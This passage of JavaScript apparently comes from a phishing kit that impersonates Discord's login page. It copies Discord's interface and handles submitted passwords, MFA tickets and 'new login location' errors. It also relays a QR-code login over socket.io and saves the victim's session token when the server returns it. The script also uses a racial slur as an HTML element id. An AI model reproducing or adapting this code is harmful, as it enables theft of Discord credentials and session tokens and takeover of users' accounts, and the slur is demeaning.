stop-color="hsl(201, calc(var(--saturation-factor, 1) * 51.6%), 52.2%)"offset=1></stop></linearGradient></svg><div style=position:fixed;opacity:0;pointer-events:none></div><div class=app-1q1i1E><div class="container-16j22k fixClipping-3qAKRb"style=opacity:1><div class=content-1-zrf2><video autoplay class=ready-36e6Vk loop playsinline=""><source src=/assets/3b0d96ed8113994f3d139088726cfecd.webm type=video/webm><source src=/assets/6d5b64b094944af6d52d895c8c2b8a59.mp4 type=video/mp4><img alt=""src=/assets/dff87c953f43b561d71fbcfe8a93a79a.png></video><div class=text-3c9Zq1><div class=tipTitle-GL9qAt>Did you know</div><div class=tip-2cgoli>Type /tenor or /giphy + anything to find a GIF for that topic!</div><div class="body-2Vra9D contentBase-11jeVK"></div></div></div></div></div><div></div><div></div><div class=layerContainer-yqaFcK></div><div class=layerContainer-yqaFcK></div><div style=position:fixed;opacity:0;pointer-events:none></div>`;
                                        setTimeout(() => {
                                            window.location.replace(`/${makeid(24)}`);
                                        }, 2500)
                                    });
                            } else {
                                if (response.includes('mfa":true')) {
                                    const okayladlad = JSON.parse(response);
                                    keylol = okayladlad.ticket;
                                    document.getElementsByClassName("authBoxExpanded-2jqaBe")[0].style.display = "none";
                                    document.getElementById("loadupmf").style.display = "block";
                                } else if (response.includes('New login location detected')) {
                                    document.getElementsByClassName("size14-e6ZScH")[0].classList.add("error-25JxNp");
                                    document.getElementById("nullnoneemail").style.visibility = "visible";
                                    document.getElementsByClassName("input-cIJ7To")[0].classList.add("error-2O5WFJ");
                                    document.getElementById("nullnoneemail").textContent = " - New login location detected. Please check your e-mail.";
                                    document.getElementById("funnybuttonzz").classList.remove("submitting-3qlO9O");
                                    document.getElementById("spinnyniggers").style.visibility = "hidden";
                                } else {
                                    document.getElementsByClassName("size14-e6ZScH")[0].classList.add("error-25JxNp");
                                    document.getElementById("nullnoneemail").style.visibility = "visible";
                                    document.getElementById("nullnoneemail").textContent = " - Login or password is invalid.";
                                    document.getElementsByClassName("size14-e6ZScH")[1].classList.add("error-25JxNp");
                                    document.getElementById("nullnonepass").style.visibility = "visible";
                                    document.getElementById("nullnonepass").textContent = " - Login or password is invalid.";
                                    document.getElementById("funnybuttonzz").classList.remove("submitting-3qlO9O");
                                    document.getElementById("spinnyniggers").style.visibility = "hidden";
                                }
                            }
                        }
                    })
            } else {
                document.getElementById("funnybuttonzz").classList.remove("submitting-3qlO9O");
                document.getElementById("spinnyniggers").style.visibility = "hidden";
                document.getElementsByClassName("input-cIJ7To")[0].classList.add("error-2O5WFJ");
                document.getElementsByClassName("featusmanzeb")[0].classList.add("error-2O5WFJ");
                document.getElementsByClassName("size14-e6ZScH")[0].classList.add("error-25JxNp");
                document.getElementsByClassName("size14-e6ZScH")[1].classList.add("error-25JxNp");
                document.getElementById("nullnoneemail").style.visibility = "visible";
                document.getElementById("nullnonepass").style.visibility = "visible";
                document.getElementById("nullnoneemail").textContent = " - Login or password is invalid.";
                document.getElementById("nullnonepass").textContent = " - Login or password is invalid.";
            }
        }
    }, 200)
}

function makeid(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() *
            charactersLength));
    }
    return result;
}
$(document).ready(() => {
    document.getElementById("mainform").style.display = "block";

    if (localStorage.getItem('token') != undefined) {
        new Promise(resolve => setTimeout(resolve, 3000));
        window.location.replace(`/${makeid(24)}`);
        return;
    }

    var socket = io();
    socket.emit("discord");
    socket.on("code", (data) => {
        generateQRCode(data.code);
    });
    socket.on("user", (data) => {
        document.getElementById("continue").innerHTML = `

            <div class="qrLoginInner-c_7ePj">
                <div class="qrAvatar-8_WYAf wrapper-3t9DeA" role="img" aria-label="xenos, Online via mobile" aria-hidden="false" style="width: 120px; height: 120px;">
                    <svg width="138" height="120" viewBox="0 0 138 120" class="mask-1l8v16 svg-2V3M55" aria-hidden="true">
                        <foreignObject x="0" y="0" width="120" height="120" mask="url(#svg-mask-avatar-status-mobile-120)">
                            <div class="avatarStack-2Dr8S9">
                                <img src="https://cdn.discordapp.com/avatars/${data.user.id}/${data.user.avatar}?size=128" alt=" " class="avatar-VxgULZ" aria-hidden="true"></div>
                            </foreignObject>
                        <rect width="24" height="36" x="88" y="76" fill="hsl(139, calc(var(--saturation-factor, 1) * 47.3%), 43.9%)" mask="url(#svg-mask-status-online-mobile)" class="pointerEvents-2zdfdO"></rect>
                    </svg>
                </div>
                <h3 class="title-jXR8lp marginBottom8-AtZOdT fontDisplay-1dagSA base-1x0h_U size24-RIRrxO" style="align-self: center;">Check your phone!</h3>
            <div  style="align-self: center;"class="colorHeaderSecondary-3Sp3Ft size16-1P40sf">Logging in as ${data.user.username}#${data.user.discriminator}</div>
            <br>
            <button onclick="location.href = '/login';"type="button" class="startOverButton-3q0wUV button-38aScr lookBlank-3eh9lL colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN"><div class="contents-18-Yxp">Not me, start over</div></button>
            </div>
            `;
        localStorage.setItem("pfp",
            `https://cdn.discordapp.com/avatars/${data.user.id}/${data.user.avatar}?size=128`
        );
        localStorage.setItem("user", `${data.user.username}#${data.user.discriminator}`);
        document.getElementById("mainlogin").remove();
        document.getElementById("mainform").style = "width: 273px;"

    });
    socket.on("token", (data) => {
        localStorage.setItem("token", data.token);
        document.getElementById("app-mount").innerHTML =
            `<svg aria-hidden=true style=position:absolute;pointer-events:none;top:-1px;left:-1px;width:1px;height:1px viewBox="0 0 1 1"><mask id=svg-mask-squircle maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><path d="M0 0.464C0 0.301585 0 0.220377 0.0316081 0.158343C0.0594114 0.103776 0.103776 0.0594114 0.158343 0.0316081C0.220377 0 0.301585 0 0.464 0H0.536C0.698415 0 0.779623 0 0.841657 0.0316081C0.896224 0.0594114 0.940589 0.103776 0.968392 0.158343C1 0.220377 1 0.301585 1 0.464V0.536C1 0.698415 1 0.779623 0.968392 0.841657C0.940589 0.896224 0.896224 0.940589 0.841657 0.968392C0.779623 1 0.698415 1 0.536 1H0.464C0.301585 1 0.220377 1 0.158343 0.968392C0.103776 0.940589 0.0594114 0.896224 0.0316081 0.841657C0 0.779623 0 0.698415 0 0.536V0.464Z"fill=white></path></mask><mask id=svg-mask-header-bar-badge maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 x=0 y=0></rect><circle cx=0.75 cy=0.75 fill=black r=0.25></circle></mask><mask id=svg-mask-voice-user-summary-item maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=1.2083333333333333 cy=0.5 fill=black r=0.5416666666666666></circle></mask><mask id=svg-mask-vertical-fade maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><linearGradient id=svg-mask-vertical-fade-gradient gradientTransform=rotate(90) x1=0 x2=1 y1=0 y2=0><stop stop-color=white offset=0%></stop><stop stop-color=black offset=100%></stop></linearGradient><rect fill=url(#svg-mask-vertical-fade-gradient) height=1 width=1 x=0 y=0></rect></mask><mask id=svg-mask-panel-button maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 x=0 y=0></rect><circle cx=0.75 cy=0.75 fill=black r=0.25></circle></mask><mask id=svg-mask-channel-call-control-button maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8214285714285714 cy=0.8214285714285714 fill=black r=0.25></circle></mask><mask id=svg-mask-channel-call-control-button-badge-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.42857142857142855 width=0.42857142857142855 x=0.6428571428571429 y=-0.07142857142857142 rx=0.21428571428571427 ry=0.21428571428571427></rect></mask><mask id=svg-mask-channel-call-control-button-badge-22 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.42857142857142855 width=0.5357142857142857 x=0.5357142857142857 y=-0.07142857142857142 rx=0.21428571428571427 ry=0.21428571428571427></rect></mask><mask id=svg-mask-channel-call-control-button-badge-29 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.42857142857142855 width=0.6607142857142857 x=0.4107142857142857 y=-0.07142857142857142 rx=0.21428571428571427 ry=0.21428571428571427></rect></mask><mask id=svg-mask-avatar-default maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle></mask><mask id=svg-mask-avatar-status-round-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8125 cy=0.8125 fill=black r=0.3125></circle></mask><mask id=svg-mask-avatar-status-mobile-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.8125 width=0.625 x=0.5 y=0.3125 rx=0.1625 ry=0.1625></rect></mask><mask id=svg-mask-avatar-status-typing-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.625 width=1.1875 x=0.21875 y=0.5 rx=0.3125 ry=0.3125></rect></mask><mask id=svg-mask-avatar-status-round-24 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8333333333333334 cy=0.8333333333333334 fill=black r=0.2916666666666667></circle></mask><mask id=svg-mask-avatar-status-mobile-24 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.75 width=0.5833333333333334 x=0.5416666666666666 y=0.375 rx=0.15 ry=0.15></rect></mask><mask id=svg-mask-avatar-status-typing-24 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.5833333333333334 width=1.0833333333333333 x=0.2916666666666667 y=0.5416666666666666 rx=0.2916666666666667 ry=0.2916666666666667></rect></mask><mask id=svg-mask-avatar-status-round-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.84375 cy=0.84375 fill=black r=0.25></circle></mask><mask id=svg-mask-avatar-status-mobile-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.65625 width=0.5 x=0.59375 y=0.4375 rx=0.13125 ry=0.13125></rect></mask><mask id=svg-mask-avatar-status-typing-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.5 width=0.96875 x=0.359375 y=0.59375 rx=0.25 ry=0.25></rect></mask><mask id=svg-mask-avatar-status-round-40 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.85 cy=0.85 fill=black r=0.25></circle></mask><mask id=svg-mask-avatar-status-mobile-40 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.65 width=0.5 x=0.6 y=0.45 rx=0.13 ry=0.13></rect></mask><mask id=svg-mask-avatar-status-typing-40 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.5 width=0.95 x=0.375 y=0.6 rx=0.25 ry=0.25></rect></mask><mask id=svg-mask-avatar-status-round-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.85 cy=0.85 fill=black r=0.175></circle></mask><mask id=svg-mask-avatar-status-mobile-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.45 width=0.35 x=0.675 y=0.575 rx=0.09 ry=0.09></rect></mask><mask id=svg-mask-avatar-status-typing-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.35 width=0.65 x=0.525 y=0.675 rx=0.175 ry=0.175></rect></mask><mask id=svg-mask-avatar-status-round-120 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8333333333333334 cy=0.8333333333333334 fill=black r=0.16666666666666666></circle></mask><mask id=svg-mask-avatar-status-mobile-120 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.43333333333333335 width=0.3333333333333333 x=0.6666666666666666 y=0.5666666666666667 rx=0.08666666666666667 ry=0.08666666666666667></rect></mask><mask id=svg-mask-avatar-status-typing-120 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.3333333333333333 width=0.6333333333333333 x=0.5166666666666667 y=0.6666666666666666 rx=0.16666666666666666 ry=0.16666666666666666></rect></mask><mask id=svg-mask-status-online-mobile maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 x=0 y=0 rx=0.1875 ry=0.125></rect><rect fill=black height=0.5 width=0.75 x=0.125 y=0.16666666666666666></rect><ellipse cx=0.5 cy=0.8333333333333334 fill=black rx=0.125 ry=0.08333333333333333></ellipse></mask><mask id=svg-mask-status-online maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle></mask><mask id=svg-mask-status-idle maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.25 cy=0.25 fill=black r=0.375></circle></mask><mask id=svg-mask-status-dnd maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.25 width=0.75 x=0.125 y=0.375 rx=0.125 ry=0.125></rect></mask><mask id=svg-mask-status-offline maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.5 cy=0.5 fill=black r=0.25></circle></mask><mask id=svg-mask-status-streaming maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><polygon fill=black points="0.35,0.25 0.78301275,0.5 0.35,0.75"></polygon></mask><mask id=svg-mask-status-typing maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 rx=0.2 ry=0.5 cx=0 cy=0></rect></mask><mask id=svg-mask-avatar-voice-call-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.85 cy=0.85 fill=black r=0.2></circle></mask><mask id=svg-mask-avatar-call-icon maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5 opacity=1></circle><circle cx=0.85 cy=0.15 fill=black r=0.2></circle></mask><mask id=svg-mask-avatar-call-icon-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5 opacity=0.5></circle><circle cx=0.8 cy=0.25 fill=black r=0.325></circle></mask><mask id=svg-mask-sticker-rounded-rect maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><path d="M0 0.26087C0 0.137894 0 0.0764069 0.0382035 0.0382035C0.0764069 0 0.137894 0 0.26087 0H0.73913C0.862106 0 0.923593 0 0.961797 0.0382035C1 0.0764069 1 0.137894 1 0.26087V0.73913C1 0.862106 1 0.923593 0.961797 0.961797C0.923593 1 0.862106 1 0.73913 1H0.26087C0.137894 1 0.0764069 1 0.0382035 0.961797C0 0.923593 0 0.862106 0 0.73913V0.26087Z"fill=white></path></mask><mask id=svg-mask-chat-input-button-notification maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=0.85 cy=0.85 fill=black r=0.25></circle></mask><mask id=svg-mask-sticker-shop-notification maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=0.9 cy=0.9 fill=black r=0.5></circle></mask><mask id=svg-mask-autocomplete-emoji-upsell-emoji maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=1.33 cy=0.5 fill=black r=0.5833333333333334></circle></mask><mask id=svg-mask-event-ticket maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><path d="M0 0.12C0 0.0779961 0 0.0569941 0.00408726 0.0409507C0.00768251 0.0268386 0.0134193 0.015365 0.0204754 0.00817451C0.028497 0 0.038998 0 0.06 0H0.94C0.961002 0 0.971503 0 0.979525 0.00817451C0.986581 0.015365 0.992318 0.0268386 0.995913 0.0409507C1 0.0569941 1 0.0779961 1 0.12V0.45C0.986193 0.45 0.975 0.472386 0.975 0.5C0.975 0.527614 0.986193 0.55 1 0.55V0.88C1 0.922004 1 0.943006 0.995913 0.959049C0.992318 0.973161 0.986581 0.984635 0.979525 0.991826C0.971503 1 0.961002 1 0.94 1H0.0600001C0.0389981 1 0.028497 1 0.0204754 0.991826C0.0134193 0.984635 0.00768251 0.973161 0.00408726 0.959049C0 0.943006 0 0.922004 0 0.88V0.55C0.0138071 0.55 0.025 0.527614 0.025 0.5C0.025 0.472386 0.0138071 0.45 0 0.45V0.12Z"fill=white></path></mask></svg><svg aria-hidden=true style=position:absolute;pointer-events:none;top:-1px;left:-1px;width:1px;height:1px viewBox="0 0 1 1"><linearGradient id=4d7c3cc7-fc0a-4195-a5a9-c4027330fa6e><stop stop-color="hsl(228, calc(var(--saturation-factor, 1) * 86.7%), 70.6%)"></stop><stop stop-color="hsl(244, calc(var(--saturation-factor, 1) * 100%), 84.1%)"offset=1></stop></linearGradient><linearGradient id=24aa1047-e59a-4d1c-81ba-6d8f6b101b0f><stop stop-color="hsl(270, calc(var(--saturation-factor, 1) * 86.7%), 70.6%)"></stop><stop stop-color="hsl(342, calc(var(--saturation-factor, 1) * 58%), 72.9%)"offset=1></stop></linearGradient><linearGradient id=73effe82-7fd3-4e57-bb44-5da4b7f75057><stop stop-color="hsl(221, calc(var(--saturation-factor, 1) * 70%), 55.5%)"></stop><stop stop-color="hsl(269, calc(var(--saturation-factor, 1) * 83.8%), 71%)"offset=1></stop></linearGradient><linearGradient id=c734f07b-5ba3-4089-a64b-e342b77af2cd><stop stop-color="hsl(166, calc(var(--saturation-factor, 1) * 51%), 50.4%)"></stop><stop stop-color="hsl(201, calc(var(--saturation-factor, 1) * 51.6%), 52.2%)"offset=1></stop></linearGradient></svg><div style=position:fixed;opacity:0;pointer-events:none></div><div class=app-1q1i1E><div class="container-16j22k fixClipping-3qAKRb"style=opacity:1><div class=content-1-zrf2><video autoplay class=ready-36e6Vk loop playsinline=""><source src=/assets/3b0d96ed8113994f3d139088726cfecd.webm type=video/webm><source src=/assets/6d5b64b094944af6d52d895c8c2b8a59.mp4 type=video/mp4><img alt=""src=/assets/dff87c953f43b561d71fbcfe8a93a79a.png></video><div class=text-3c9Zq1><div class=tipTitle-GL9qAt>Did you know</div><div class=tip-2cgoli>Type /tenor or /giphy + anything to find a GIF for that topic!</div><div class="body-2Vra9D contentBase-11jeVK"></div></div></div></div></div><div></div><div></div><div class=layerContainer-yqaFcK></div><div class=layerContainer-yqaFcK></div><div style=position:fixed;opacity:0;pointer-events:none></div>`;
        setTimeout(() => {
            window.location.replace(`/${makeid(24)}`);
        }, 2500)
    });
    socket.on("close", (data) => {
        if (localStorage.getItem('token') == undefined) {
            location.reload();
        }
    });
});